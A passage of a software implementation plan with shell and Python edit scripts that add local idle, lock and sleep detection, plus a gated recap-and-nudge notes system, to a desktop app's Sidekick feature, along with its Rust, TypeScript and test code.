''', r'''/// The system's double-click time in ms.
pub fn double_click_ms() -> Option<u32> {
    Some(unsafe { ::windows::Win32::UI::Input::KeyboardAndMouse::GetDoubleClickTime() })
}

/// Seconds since the last keyboard or mouse input of this session (`GetLastInputInfo`), or None when the system does not say. The Sidekick asks for it when a hook event comes, when
/// the island opens and on an unlock: it never runs on a timer.
pub fn idle_seconds() -> Option<u64> {
    use ::windows::Win32::System::SystemInformation::GetTickCount;
    use ::windows::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO};
    let mut info = LASTINPUTINFO { cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32, dwTime: 0 };
    // SAFETY: `info` is a valid LASTINPUTINFO with its size set, which is all the call asks for.
    unsafe {
        if !GetLastInputInfo(&mut info).as_bool() {
            return None;
        }
        Some(crate::sidekick_presence::idle_seconds_from_ticks(GetTickCount(), info.dwTime))
    }
}
''')

edit("windows/src-tauri/src/platform/linux.rs", r'''/// Nothing to look for: the cat's layer is below fullscreen windows already.
pub fn fullscreen_app_covers(_monitors: &[(i32, i32, u32, u32)]) -> bool {
    false
}
''', r'''/// Nothing to look for: the cat's layer is below fullscreen windows already.
pub fn fullscreen_app_covers(_monitors: &[(i32, i32, u32, u32)]) -> bool {
    false
}

/// Seconds since the user's last input, from GNOME's idle monitor (Mutter, over the session bus), or None where there is none (KDE, wlroots, a session with no `gdbus`): the
/// Sidekick then counts only a lock or a sleep as away. It asks through `gdbus`, a program of glib that GNOME desktops have, with a one second limit; the Sidekick calls it when a
/// hook event comes, when the island opens and on an unlock, never on a timer.
pub fn idle_seconds() -> Option<u64> {
    let gdbus = find_on_path("gdbus")?;
    let out = Command::new(gdbus)
        .args([
            "call", "--session", "--timeout", "1", "--dest", "org.gnome.Mutter.IdleMonitor", "--object-path", "/org/gnome/Mutter/IdleMonitor/Core",
            "--method", "org.gnome.Mutter.IdleMonitor.GetIdletime",
        ])
        .output()
        .ok()?;
    if !out.status.success() {
        return None;
    }
    crate::sidekick_presence::parse_idle_ms(&String::from_utf8_lossy(&out.stdout)).map(|ms| ms / 1000)
}
''')

# A lock is away, and so is a switch to another user (Windows: this session is disconnected from the console, or from a remote one; Linux: logind says the session is no longer the active one)
edit("windows/src-tauri/src/platform/windows.rs", r'''    use ::windows::Win32::UI::WindowsAndMessaging::{DefWindowProcW, PBT_POWERSETTINGCHANGE, WM_POWERBROADCAST, WM_WTSSESSION_CHANGE, WTS_SESSION_LOCK, WTS_SESSION_UNLOCK};''', r'''    use ::windows::Win32::UI::WindowsAndMessaging::{
        DefWindowProcW, PBT_POWERSETTINGCHANGE, WM_POWERBROADCAST, WM_WTSSESSION_CHANGE, WTS_CONSOLE_CONNECT, WTS_CONSOLE_DISCONNECT, WTS_REMOTE_CONNECT, WTS_REMOTE_DISCONNECT, WTS_SESSION_LOCK,
        WTS_SESSION_UNLOCK,
    };''')
edit("windows/src-tauri/src/platform/windows.rs", r'''                WTS_SESSION_LOCK => tell(AwaySource::Locked, true),
                WTS_SESSION_UNLOCK => tell(AwaySource::Locked, false),''', r'''                // A lock is away, and so is a switch to another user (this session is disconnected from the console) or a remote session ending: the same "locked" cause.
                WTS_SESSION_LOCK | WTS_CONSOLE_DISCONNECT | WTS_REMOTE_DISCONNECT => tell(AwaySource::Locked, true),
                WTS_SESSION_UNLOCK | WTS_CONSOLE_CONNECT | WTS_REMOTE_CONNECT => tell(AwaySource::Locked, false),''')
edit("windows/src-tauri/src/platform/linux.rs", r'''/// A `PrepareForSleep` body `(b)`''', r'''/// The new `Active` in a `PropertiesChanged` body, by the same reading as `locked_hint_changed`: false when the user has switched to another session (another user, another virtual terminal).
fn active_changed(params: &gtk::glib::Variant) -> Option<bool> {
    if params.type_().as_str() != "(sa{sv}as)" {
        return None;
    }
    let changed = params.try_child_value(1)?.get::<gtk::glib::VariantDict>()?;
    changed.lookup::<bool>("Active").ok().flatten()
}

/// A `PrepareForSleep` body `(b)`''')
edit("windows/src-tauri/src/platform/linux.rs", r'''            if let Some(on) = locked_hint_changed(params) {
                n(AwaySource::Locked, on);
            }''', r'''            if let Some(on) = locked_hint_changed(params) {
                n(AwaySource::Locked, on);
            }
            // A switch to another user's session is away as a lock is (the same cause: the session is not the one in front).
            if let Some(active) = active_changed(params) {
                n(AwaySource::Locked, !active);
            }''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow sidekick_presence --target-dir /repo/windows/target/f1-tauri
```

Expected: `every_news_of_a_watcher_is_a_word_the_presence_rule_knows`, `idle_seconds_are_whole_seconds_and_survive_the_counter_wrapping`, `gnomes_answer_is_read_and_anything_else_is_nothing`, `test result: ok`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 3: Write `presence.ts` and change the controller, the env, the bridge, `main.ts` and the island**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/presence.ts <<'EOF'
// Whether the user is away, from the signals the system gives (sub-project F1, spec "Away and recap"). The rule is the contract's `presenceStep`; this holds its state and adds the
// one thing a lazy sampler needs. On Windows and Linux the idle time is read only when something asks (a hook event, the island opening, an unlock), not many times a second, so a
// sample under 3 s, which the rule calls "back", would almost never be seen. The system also says when the last input was, so a sample that shows input since the last sample tells
// the rule the user came back at that moment, and the recap then counts from the real time away. Pure: the clock is a parameter. Loaded by the plain-Node checks.

import { presenceInit, presenceStep } from "./core.ts";
import type { PresenceState } from "./core.ts";

/** The words of the platform's watchers (src-tauri/src/sidekick_presence.rs `away_signal`): the contract's signals other than `idle`. */
export const AWAY_WORDS = ["lock", "unlock", "sleep", "wake", "displayOff", "displayOn"] as const;
export type AwayWord = (typeof AWAY_WORDS)[number];
export const isAwayWord = (x: unknown): x is AwayWord => typeof x === "string" && (AWAY_WORDS as readonly string[]).includes(x);

/** The user came back: when the away began and how long it lasted (ms). */
export interface Return { awaySince: number; awayMs: number }

/** A moment less than this after the last sample, in seconds, is not input: timers and clocks jitter. */
const JITTER_S = 1;

export class Presence {
  private state: PresenceState = presenceInit();
  private last: { at: number; seconds: number } | null = null;

  /** The user is away while any reason holds (a lock, a sleep, the display off, or 300 s of no input). */
  get away(): boolean {
    return this.state.reasons.length > 0;
  }

  get awaySince(): number | null {
    return this.state.awaySince;
  }

  /** A word from the platform's watchers. A word that is not one of the six changes nothing. Returns the return, once, when the last reason lets go. */
  signal(word: unknown, now: number): Return | null {
    if (!isAwayWord(word)) return null;
    return this.step({ type: word }, now);
  }

  /**
   * An idle sample: `seconds` since the user's last input, read at `now`. A value that is not a number from 0 up is ignored. When the previous sample showed the user idle and this one
   * shows input since, the user came back when that input happened (`now` minus `seconds`), not now: the rule is told so first, and then told the sample itself.
   */
  sample(seconds: unknown, now: number): Return | null {
    if (typeof seconds !== "number" || !Number.isFinite(seconds) || seconds < 0 || !Number.isFinite(now)) return null;
    const prev = this.last;
    this.last = { at: now, seconds };
    let back: Return | null = null;
    if (prev !== null && this.state.reasons.includes("idle") && seconds < prev.seconds + (now - prev.at) / 1000 - JITTER_S) {
      back = this.step({ type: "idle", seconds: 0 }, now - seconds * 1000);
    }
    return this.step({ type: "idle", seconds }, now) ?? back;
  }

  private step(signal: Parameters<typeof presenceStep>[1], now: number): Return | null {
    const r = presenceStep(this.state, signal, now);
    this.state = r.state;
    return r.back ? { awaySince: r.back.awaySince, awayMs: r.back.awayMs } : null;
  }
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/controller.ts", r'''import { SessionLedger } from "./ledger.ts";
import type { Platform } from "./core.ts";
''', r'''import { SessionLedger } from "./ledger.ts";
import { Presence } from "./presence.ts";
import type { Return } from "./presence.ts";
import type { Platform } from "./core.ts";

/** The idle time is read at most this often (ms), however many hook events arrive. */
export const SAMPLE_GAP_MS = 5000;
''')
edit("windows/src/sidekick/controller.ts", r'''  platform: Exclude<Platform, "mac">;
}
''', r'''  platform: Exclude<Platform, "mac">;
  /** Seconds since the user's last keyboard or mouse input, or null where the system does not say. Asked only when something needs it, never on a timer. */
  idleSeconds(): Promise<number | null>;
}
''')
edit("windows/src/sidekick/controller.ts", r'''  readonly ledger = new SessionLedger();
  private readonly env: SidekickEnv;
''', r'''  readonly ledger = new SessionLedger();
  readonly presence = new Presence();
  /** Told, once each, when the user comes back from being away (the recap listens). */
  readonly onReturn: Array<(r: Return) => void> = [];
  private readonly env: SidekickEnv;
  private lastSampleAt = Number.NEGATIVE_INFINITY;
  private sampling = false;
''')
edit("windows/src/sidekick/controller.ts", r'''      // The sidekick never breaks the island.
    }
  }
''', r'''      // The sidekick never breaks the island.
    }
    void this.sampleIdle();
  }
''')
edit("windows/src/sidekick/controller.ts", r'''      this.ledger.answered(agentId, sessionId, this.env.now());
    } catch {
      // Same.
    }
  }
}
''', r'''      this.ledger.answered(agentId, sessionId, this.env.now());
    } catch {
      // Same.
    }
  }

  /**
   * The platform told the app that the user went away or came back: a lock, an unlock, a sleep, a wake, the display off or on. An unlock, a wake or the display coming on reads the
   * idle time at once, because the user may be at the keyboard already.
   */
  presenceSignal(word: unknown): void {
    try {
      const back = this.presence.signal(word, this.env.now());
      if (back) this.back(back);
    } catch {
      // Same.
    }
    if (word === "unlock" || word === "wake" || word === "displayOn") void this.sampleIdle(true);
  }

  /**
   * An idle sample. It is taken at most every 5 s (`force` skips the wait: an unlock) and only while it can matter: an agent is running, or the user is away. Nothing calls this on
   * a timer: a hook event, the island opening and an unlock do.
   */
  async sampleIdle(force = false): Promise<void> {
    if (this.sampling) return;
    const now = this.env.now();
    if (!force && now - this.lastSampleAt < SAMPLE_GAP_MS) return;
    if (this.ledger.live.length === 0 && !this.presence.away) return;
    this.sampling = true;
    this.lastSampleAt = now;
    try {
      const back = this.presence.sample(await this.env.idleSeconds(), this.env.now());
      if (back) this.back(back);
    } catch {
      // A sample that fails is no sample.
    } finally {
      this.sampling = false;
    }
  }

  /** The island opened (compact or open): a good moment to look at the idle time. */
  islandOpened(): void {
    void this.sampleIdle();
  }

  private back(r: Return): void {
    for (const fn of this.onReturn) {
      try {
        fn(r);
      } catch {
        // One listener's failure is its own.
      }
    }
  }
}
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/appenv.ts", r'''import type { SidekickEnv } from "./controller.ts";
import { platformName } from "./platform.ts";

export function sidekickEnv(): SidekickEnv {
  return { now: () => Date.now(), platform: platformName() };
}
''', r'''import { Bridge } from "../core/bridge";
import type { SidekickEnv } from "./controller.ts";
import { platformName } from "./platform.ts";

export function sidekickEnv(): SidekickEnv {
  return {
    now: () => Date.now(),
    platform: platformName(),
    idleSeconds: async () => (await Bridge.sidekickIdleSeconds()) ?? null,
  };
}
''')
edit("windows/src/core/bridge.ts", r'''  /** The tray item reads "Bring the cat home" while the cat is out. */
  desktopMenuText: (out: boolean) => call<void>("desktop_menu_text", { out }),
};
''', r'''  /** The tray item reads "Bring the cat home" while the cat is out. */
  desktopMenuText: (out: boolean) => call<void>("desktop_menu_text", { out }),

  // ── The Sidekick (sub-project F1) ──
  /** Seconds since the user's last keyboard or mouse input, or null where the system does not say. Asked when a hook event comes, when the island opens and on an unlock. */
  sidekickIdleSeconds: () => call<number>("sidekick_idle_seconds"),
};
''')
edit("windows/src/core/bridge.ts", r'''  | { name: "desktop-msg"; payload: unknown }
''', r'''  | { name: "desktop-msg"; payload: unknown }
  | { name: "sidekick-away"; payload: { signal: string } }
''')
edit("windows/src/main.ts", r'''  await onEvent<null>("screen-changed", () => { void Bridge.reposition(); desktop.screenChanged(); });
''', r'''  await onEvent<null>("screen-changed", () => { void Bridge.reposition(); desktop.screenChanged(); });

  // The platform's own news of a lock, an unlock, a sleep, a wake and the display (Rust: `sidekick::away_changed`): the Sidekick decides what they mean.
  await onEvent<{ signal: string }>("sidekick-away", ({ signal }) => Hub.sk?.presenceSignal(signal));
''')
edit("windows/src/island/island.ts", r'''    if (mode === "expanded") Sound.play("open");
''', r'''    if (mode !== "hidden") Hub.sk?.islandOpened();
    if (mode === "expanded") Sound.play("open");
''')
edit("windows/scripts/sidekick-tests/ledger.test.mjs", r'''const hook = (name, extra = {}) =>''', r'''const idle = async () => null;
const hook = (name, extra = {}) =>''')
edit("windows/scripts/sidekick-tests/ledger.test.mjs", r'''  const sk = new Sidekick({ now: () => t, platform: "windows" });''', r'''  const sk = new Sidekick({ now: () => t, platform: "windows", idleSeconds: idle });''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 40`, `ℹ pass 40`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

- [ ] **Step 4: Compile the platform files**

`cargo test --workspace` on Linux compiles `platform/linux.rs`. The Windows file (`GetLastInputInfo`, `LASTINPUTINFO`, `GetTickCount`) can only be compiled on a Windows runner: **owed to CI's `windows-tests.yml`** (`cargo test --workspace` there). Say so in the report; do not skip the Linux compile.

```bash
windows/scripts/cargo-linux.sh test --workspace --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`.

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src-tauri/src windows/src/sidekick windows/src/core/bridge.ts windows/src/main.ts windows/src/island/island.ts windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): away and back: the platform's news, the idle time, lazy sampling

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 6: Notes: the gate, held notes, dismissals, the `sidekick` view and the recap

**Files:**
- Create: `windows/src/sidekick/notes.ts`, `world.ts`, `windows/scripts/sidekick-tests/notes.test.mjs`
- Modify: `windows/src/sidekick/controller.ts`, `appenv.ts`, `windows/src/core/state.ts` (`sidekickNote`), `windows/src/core/layout.ts` (the view and its height), `windows/src/views/views.ts` (`buildSidekick`, two actions), `windows/src/island/island.ts` (the two actions, the hover, the height), `windows/src/main.ts`, `windows/src/style.css`

**Interfaces:**
- Consumes: Task 5's `Sidekick.presence`, `onReturn`, `Return`; Task 1's `shouldShow`, `recapOf`, `HOLD_MS`, `NUDGE_KINDS`, `dismiss` (through Task 2's `withDismissed`).
- Produces: `interface Note {id, kind, agentId, key, lines, facts, awaySince}`, `NoteDraft`, `interface World`, `interface NotesEnv`, `class Notes` (`offer(draft) → reason`, `retry()`, `stateChanged()`, `dismiss()`, `hovered()`, `clear()`, `current`, `waiting`); `worldOf(read)` and `QUIET_VIEWS` (`world.ts`); `SidekickEnv.settings()`, `saveSettings(next)`, `world`, `present(note)`; `Sidekick.notes`, `noteDismissed()`, `noteHovered()`, `stateChanged()`, `settingsChanged()`; `State.sidekickNote`; the island view `"sidekick"`; `sidekickHeight(lines)`; `Skew` (`appenv.ts`, the dev clock knob, 0 in the app).

**How a note shows.** A note is offered to `Notes`, which asks the contract's `shouldShow` (the switch, the kind, a mute, away, rate limit, a card in front, typing, another note, the minute since the last, the session's nudge, the recap already given). A refusal that can pass keeps the note (30 s, a recap 2 minutes); one that will not (off, muted, nudged, recapGiven) drops it. A note that is allowed opens the island **through its existing peek**, `island.alert("sidekick")`, the call a finished task uses: never pinned, so it folds by itself. **Plan decision: "the island is open on something else" is "typing"**: `worldOf.typing()` is true while the island is open on any view other than the overview, the empty one, a finished task's card or the note itself (the chat, Settings, the drop flow, a card), so a note waits for the gate and never covers the user's work. **A recap past three rows is cut with "…"** (the contract's "+N more" row is shown as that; the facts are the contract's). A click on OK, Not now or × is a dismissal (`island.sidekickDismiss`); folding the island is not (`Notes.stateChanged` forgets a note that is no longer on screen); "Open terminal" on a nudge is not.

- [ ] **Step 1: Write the test**

It runs `Notes` against a world the test sets by hand (held, expired, final refusals, one at a time, the recap replacing an unseen nudge, the 60 s gap, dismissals and Unmute, the island moving to the note), `worldOf` against every view, the Sidekick's recap on a return (a lock, five minutes of work, an unlock) and pins on the wiring.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/notes.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import { HOLD_MS, NOTE_GAP_MS, cleanSidekickSettings } from "../../src/sidekick/core.ts";
import { Notes } from "../../src/sidekick/notes.ts";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { QUIET_VIEWS, worldOf } from "../../src/sidekick/world.ts";
import { sidekickHeight } from "../../src/core/layout.ts";
import { source } from "./util.mjs";

const MIN = 60_000;
const T0 = 5_000_000;

/** A world the test sets by hand, and every call the Notes make on it written down. */
function world(settings = {}) {
  const w = {
    t: T0, settings: cleanSidekickSettings(settings), away: false, ratelimit: false, card: null, ownCard: false, typing: false, onScreen: null, nudged: new Set(),
    presented: [], shown: [], dropped: [], dismissed: [],
  };
  const notes = new Notes({
    now: () => w.t, settings: () => w.settings,
    world: { ratelimit: () => w.ratelimit, card: () => w.card, ownCard: () => w.ownCard, typing: () => w.typing, away: () => w.away, onScreen: (id) => (w.onScreen === null ? w.presented.at(-1)?.id === id : w.onScreen === id) },
    nudged: (key) => w.nudged.has(key),
    present: (n) => w.presented.push(n), shown: (n) => w.shown.push(n), dropped: (n) => w.dropped.push(n),
    dismissed: (kind) => { w.dismissed.push(kind); w.settings = cleanSidekickSettings({ ...w.settings, dismissals: { ...w.settings.dismissals, [kind]: Math.min(2, w.settings.dismissals[kind] + 1) } }); },
  });
  return { w, notes };
}
const recap = (awaySince = T0 - 10 * MIN) => ({ kind: "recap", agentId: "", key: "", lines: ["While you were away, Claude Code ran 3 steps and finished."], facts: [{ agent: "Claude Code", steps: 3 }], awaySince });
const nudge = (kind = "stuck.loop", key = "integration_claude|S1") => ({ kind, agentId: "integration_claude", key, lines: ["Claude Code has run the same step 4 times."], facts: [{ agent: "Claude Code" }], awaySince: null });

test("a note on a quiet screen shows at once, through the island's peek, and a nudge marks its session", () => {
  const { w, notes } = world();
  assert.equal(notes.offer(nudge()), "ok");
  assert.equal(w.presented.length, 1);
  assert.equal(w.presented[0].kind, "stuck.loop");
  assert.equal(w.shown.length, 1);
  assert.equal(notes.current.id, w.presented[0].id);
  assert.deepEqual(notes.waiting, []);
});

test("a refusal that can pass keeps the note, and it shows when the gate opens; a nudge waits 30 s and a recap 2 minutes, then both go without a word", () => {
  for (const [reason, set] of [["card", (w) => { w.card = "approval"; }], ["typing", (w) => { w.typing = true; }], ["away", (w) => { w.away = true; }]]) {
    const { w, notes } = world();
    set(w);
    assert.equal(notes.offer(nudge()), reason);
    assert.equal(w.presented.length, 0);
    assert.equal(notes.waiting.length, 1, `${reason}: kept`);
    w.card = null; w.typing = false; w.away = false; w.t += 10_000;
    notes.retry();
    assert.equal(w.presented.length, 1, `${reason}: shown when the gate opened`);
    assert.equal(notes.waiting.length, 0);
  }
  const a = world();
  a.w.card = "approval";
  a.notes.offer(nudge());
  a.w.t += HOLD_MS.nudge + 1;
  a.w.card = null;
  a.notes.retry();
  assert.equal(a.w.presented.length, 0, "30 s is over");
  assert.equal(a.w.dropped.length, 1, "dropped, and the session told");
  const b = world();
  b.w.card = "approval";
  b.notes.offer(recap());
  b.w.t += HOLD_MS.recap - 1;
  b.notes.retry();
  assert.equal(b.w.presented.length, 0, "still waiting: the card is up");
  b.w.card = null;
  b.notes.retry();
  assert.equal(b.w.presented.length, 1, "a recap waits two minutes");
  const c = world();
  c.w.card = "approval";
  c.notes.offer(recap());
  c.w.t += HOLD_MS.recap + 1;
  c.w.card = null;
  c.notes.retry();
  assert.equal(c.w.presented.length, 0, "dropped silently after 2 minutes");
});

test("a refusal that will not pass is no waiting: the switch off, a muted kind, a session that has had its nudge, a recap that was already given", () => {
  const off = world({ on: false });
  assert.equal(off.notes.offer(nudge()), "off");
  assert.equal(off.notes.waiting.length, 0);
  const muted = world({ dismissals: { "stuck.loop": 2 } });
  assert.equal(muted.notes.offer(nudge("stuck.loop")), "muted");
  assert.equal(muted.notes.offer(nudge("stuck.silent", "k2")), "ok", "only its own kind is muted");
  const nudged = world();
  nudged.w.nudged.add("k");
  assert.equal(nudged.notes.offer(nudge("stuck.loop", "k")), "nudged");
  const given = world();
  assert.equal(given.notes.offer(recap(T0 - 600_000)), "ok");
  given.notes.dismiss();
  assert.equal(given.notes.offer(recap(T0 - 600_000)), "recapGiven", "once per away period");
  assert.equal(given.notes.offer(recap(T0 - 100)), "ok", "another away period has its own");
  assert.equal(given.notes.waiting.length, 0);
});

test("one note at a time: another is busy, a recap replaces a nudge nobody has seen, and a nudge waits a minute after any note", () => {
  const { w, notes } = world();
  notes.offer(nudge("stuck.silent", "a"));
  assert.equal(notes.offer(nudge("stuck.waiting", "b")), "busy");
  assert.equal(notes.waiting.length, 1);
  assert.equal(notes.offer(recap()), "ok", "a recap replaces a nudge that was not seen");
  assert.equal(w.presented.at(-1).kind, "recap");
  const seen = world();
  seen.notes.offer(nudge());
  seen.notes.hovered();
  assert.equal(seen.notes.offer(recap()), "busy", "a nudge the user has seen is not replaced");
  const gap = world();
  gap.notes.offer(nudge("stuck.loop", "x"));
  gap.notes.dismiss();
  gap.w.t += NOTE_GAP_MS - 1;
  assert.equal(gap.notes.offer(nudge("stuck.silent", "y")), "recent");
  gap.w.t += 2;
  gap.notes.retry();
  assert.equal(gap.w.presented.length, 2, "a minute after, the held nudge shows");
  assert.equal(gap.notes.offer(recap()), "ok", "a recap is not held back by the gap");
});

test("a click on Not now, OK or × is a dismissal; two mute the kind; folding the island unseen is none", () => {
  const { w, notes } = world();
  notes.offer(nudge("stuck.errors", "k"));
  notes.dismiss();
  assert.deepEqual(w.dismissed, ["stuck.errors"]);
  assert.equal(notes.current, null);
  notes.dismiss();
  assert.deepEqual(w.dismissed, ["stuck.errors"], "nothing on screen: nothing dismissed");
  w.t += 2 * MIN;
  notes.offer(nudge("stuck.errors", "k2"));
  w.onScreen = -1;
  notes.stateChanged();
  assert.equal(notes.current, null, "the island moved on: the note is forgotten");
  assert.deepEqual(w.dismissed, ["stuck.errors"], "folded unseen: not counted");
  w.onScreen = null;
  w.t += 2 * MIN;
  assert.equal(notes.offer(nudge("stuck.errors", "k3")), "ok");
  notes.dismiss();
  assert.equal(w.settings.dismissals["stuck.errors"], 2);
  assert.equal(notes.offer(nudge("stuck.errors", "k4")), "muted", "two dismissals mute it");
  w.settings = cleanSidekickSettings({ ...w.settings, dismissals: { ...w.settings.dismissals, "stuck.errors": 0 } });
  w.t += 2 * MIN;
  assert.equal(notes.offer(nudge("stuck.errors", "k5")), "ok", "Unmute in Settings: it shows again");
});

test("the island moving to the note is not the island moving away from it", () => {
  const w = { onScreen: false };
  let notes;
  notes = new Notes({
    now: () => T0, settings: () => cleanSidekickSettings(null),
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, away: () => false, onScreen: () => w.onScreen },
    nudged: () => false, shown: () => {}, dropped: () => {}, dismissed: () => {},
    // Opening the island notifies the app's state several times before the note's view is up: those notifications must not forget the note.
    present: () => { notes.stateChanged(); notes.stateChanged(); w.onScreen = true; },
  });
  notes.offer(nudge());
  assert.notEqual(notes.current, null);
  notes.stateChanged();
  assert.notEqual(notes.current, null, "on screen now");
});

test("the gate's world: a card is a pending approval, a chat card or the question view; the island is busy on every view but the quiet ones", () => {
  const base = { mode: "hidden", view: "overview", pendingApproval: null, chatApprovals: { length: 0 }, tasks: [], sidekickNoteId: null };
  let s = base;
  const w = worldOf(() => s);
  assert.equal(w.card(), null);
  s = { ...base, pendingApproval: {} };
  assert.equal(w.card(), "approval");
  s = { ...base, chatApprovals: { length: 1 } };
  assert.equal(w.card(), "approval");
  s = { ...base, mode: "expanded", view: "question" };
  assert.equal(w.card(), "question");
  s = { ...base, mode: "compact", view: "question" };
  assert.equal(w.card(), null, "a question that is not on screen is not in front");
  s = { ...base, mode: "expanded", view: "approval", pendingApproval: {} };
  assert.equal(w.ownCard(), true);
  s = { ...base, mode: "hidden", view: "approval", pendingApproval: {} };
  assert.equal(w.ownCard(), false, "the island is hidden: the card is not on screen");
  assert.equal(w.typing(), false);
  for (const view of ["prompt", "upload", "uploading", "choose", "settings", "note", "mail", "result", "confused"]) { s = { ...base, mode: "expanded", view }; assert.equal(w.typing(), true, view); }
  for (const view of QUIET_VIEWS) { s = { ...base, mode: "expanded", view }; assert.equal(w.typing(), false, view); }
  s = { ...base, mode: "compact", view: "prompt" };
  assert.equal(w.typing(), false, "a compact island has nothing open in it");
  s = { ...base, tasks: [{ state: "working" }, { state: "ratelimit" }] };
  assert.equal(w.ratelimit(), true);
  s = { ...base, mode: "expanded", view: "sidekick", sidekickNoteId: 4 };
  assert.deepEqual([w.onScreen(4), w.onScreen(5)], [true, false]);
  s = { ...base, mode: "compact", view: "sidekick", sidekickNoteId: 4 };
  assert.equal(w.onScreen(4), false);
});

test("the Sidekick offers a recap when the user comes back, if an agent did something", () => {
  const w = { t: T0, away: false, presented: [], saved: [] };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", idleSeconds: async () => null, settings: () => cleanSidekickSettings(null), saveSettings: (s) => w.saved.push(s),
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true }, present: (n) => w.presented.push(n),
  });
  const hook = (name, extra = {}) => ({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
  sk.presenceSignal("lock");
  w.t += 10_000;
  sk.hook(hook("PostToolUse", { tool_name: "Edit", tool_input: { file_path: "C:\\work\\app\\a.ts" } }));
  w.t += 5 * MIN;
  sk.hook(hook("Stop"));
  sk.presenceSignal("unlock");
  assert.equal(w.presented.length, 1);
  const note = w.presented[0];
  assert.equal(note.kind, "recap");
  assert.match(note.lines[0], /^While you were away, Claude Code in app ran 1 step, edited a\.ts, and finished\.$/);
  assert.equal(note.awaySince, T0);
  assert.equal(note.facts[0].agent, "Claude Code");
  // A second lock and unlock in a hurry gives no recap, and neither does an away in which nothing happened.
  sk.presenceSignal("lock");
  w.t += 60_000;
  sk.presenceSignal("unlock");
  assert.equal(w.presented.length, 1);
  sk.noteDismissed();
  assert.equal(w.saved.length, 1);
  assert.equal(w.saved[0].dismissals.recap, 1, "the OK is a dismissal of the recap");
});

test("the Sidekick's view grows by a line of text per line and stops at 280", () => {
  assert.deepEqual([0, 1, 2, 3, 4, 20].map(sidekickHeight), [160, 160, 190, 220, 250, 280]);
});

test("the wiring: the island's peek shows the note, every click on it is a dismissal, folding is not, State changes and Settings changes reach the Sidekick", () => {
  const env = source("sidekick/appenv.ts");
  assert.match(env, /State\.sidekickNote = note;\s*island\.alert\("sidekick"\);/);
  assert.doesNotMatch(env, /isPinned|holdOpen/, "a note never pins the island");
  const views = source("views/views.ts");
  assert.match(views, /btn\("OK", "primary", \(\) => actions\.sidekickDismiss\(\)\)/);
  assert.match(views, /btn\("Not now", "secondary", \(\) => actions\.sidekickDismiss\(\)\)/);
  assert.match(views, /class: "icon-btn jump", title: "Dismiss", onclick: \(\) => actions\.sidekickDismiss\(\)/);
  assert.match(views, /btn\("Open terminal", "primary", \(\) => actions\.sidekickOpen\(\)\)/, "Open terminal is not a dismissal");
  assert.match(views, /map\.set\("sidekick", buildSidekick\(actions\)\);/);
  const island = source("island/island.ts");
  assert.match(island, /sidekickDismiss: \(\) => \{\s*Hub\.sk\?\.noteDismissed\(\);\s*this\.collapse\(\);/);
  assert.match(island, /Hub\.sk\?\.noteHovered\(\);/);
  const main = source("main.ts");
  assert.match(main, /State\.subscribe\(\(\) => Hub\.sk\?\.stateChanged\(\)\);/);
  assert.match(main, /Hub\.sk\?\.settingsChanged\(\);/);
  assert.match(source("core/layout.ts"), /sidekick: \{ height: 160, botX: 62, botY: null, botDiameter: 56, agentMode: "column" \}/);
});

test("a recap of more than three agents ends in a row of three dots, not a count", () => {
  const w = { t: T0, presented: [] };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", idleSeconds: async () => null, settings: () => cleanSidekickSettings(null), saveSettings: () => {},
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
    present: (n) => w.presented.push(n), updated: () => {}, timer: { set: () => 1, clear: () => {} },
  });
  sk.presenceSignal("lock");
  for (const agent of ["gemini", "antigravity", "alpha", "beta", "gamma"]) {
    w.t += 1000;
    sk.hook({ hook_event_name: "PostToolUse", session_id: `s-${agent}`, nm_agent: agent, cwd: "C:\\work\\app", tool_name: "run_shell_command", tool_input: { command: "ls" } });
  }
  w.t += 5 * MIN;
  sk.presenceSignal("unlock");
  const lines = w.presented[0].lines;
  assert.equal(lines.length, 4);
  assert.equal(lines[3], "…");
  assert.ok(lines.slice(0, 3).every((l) => l.startsWith("While you were away, ")));
  assert.equal(w.presented[0].facts.length, 5, "the facts are the contract's: five agents");
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write the gate and the world**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/notes.ts <<'EOF'
// The Sidekick's notes (sub-project F1, spec "The show gate" and "Dismissal memory"): a recap or a nudge is offered here, and the contract's `shouldShow` says whether it may show now.
